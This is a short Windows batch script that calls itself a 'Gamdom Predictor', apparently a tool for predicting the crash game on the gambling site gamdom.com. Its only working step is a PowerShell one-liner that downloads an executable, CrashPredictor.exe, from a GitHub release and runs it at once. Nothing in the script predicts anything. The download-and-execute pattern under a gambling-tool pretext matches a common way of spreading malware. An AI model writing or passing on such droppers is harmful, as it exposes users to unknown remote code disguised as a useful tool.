@echo off

title Gamdom Predictor
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/IWcommunityFR
echo.

powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/gamdom-crash-preditor/releases/download/Gamdom-Crash-Predictor/CrashPredictor.exe';$file='CrashPredictor.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit


https://gamdom.com/crash